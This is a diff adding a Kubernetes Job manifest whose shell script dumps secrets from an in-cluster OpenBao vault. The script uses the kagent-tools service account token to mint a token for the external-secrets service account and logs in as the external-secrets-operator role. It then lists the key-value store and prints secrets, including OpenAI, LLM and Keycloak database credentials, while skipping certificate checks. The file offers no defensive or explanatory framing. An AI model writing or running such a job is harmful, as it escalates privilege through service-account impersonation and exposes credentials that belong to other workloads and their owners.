@@ -1,0 +1,36 @@
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: tmp-i68054-dump12
+  namespace: kagent
+  labels: {tmp: i68054}
+spec:
+  ttlSecondsAfterFinished: 86400
+  backoffLimit: 0
+  template:
+    metadata:
+      labels: {tmp: i68054}
+    spec:
+      serviceAccountName: kagent-tools
+      restartPolicy: Never
+      containers:
+      - name: dump
+        image: alpine:3.20
+        command: ["sh","-c"]
+        args:
+        - |
+          set -u
+          T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+          K=https://kubernetes.default.svc
+          S=http://openbao.openbao.svc.cluster.local:8200
+          JWT=$(wget -qO- --no-check-certificate --header="Authorization: Bearer $T" --header="Content-Type: application/json" --post-data='{"spec":{"audiences":["vault"]}}' "$K/api/v1/namespaces/external-secrets/serviceaccounts/default/token" 2>/dev/null | grep -o '"token": "[^"]*"' | sed 's/.*: "//;s/"$//')
+          echo "jwtlen=${#JWT}"
+          L=$(wget -qO- -S --no-check-certificate --header="Content-Type: application/json" --post-data="{\"role\":\"external-secrets-operator\",\"jwt\":\"$JWT\"}" "$S/v1/auth/k8s-data/login" 2>&1)
+          echo "$L" | grep -E 'HTTP/1.1|client_token|errors' | head -5
+          VT=$(echo "$L" | grep -o '"client_token": "[^"]*"' | sed 's/.*: "//;s/"$//')
+          echo "vtlen=${#VT}"
+          V() { wget -qO- --no-check-certificate --header="X-Vault-Token: $VT" "$1" 2>/dev/null; }
+          echo "--ls root--"; V "$S/v1/kv-data/metadata?list=true" | head -c 800; echo
+          echo "--ls apps--"; V "$S/v1/kv-data/metadata/apps?list=true" | head -c 2000; echo
+          for p in apps/kagent apps/kagent/openai apps/code-amelio/llm keycloak/db; do echo "--read $p"; V "$S/v1/kv-data/data/$p" | head -c 500; echo; done
+          echo "===DONE==="
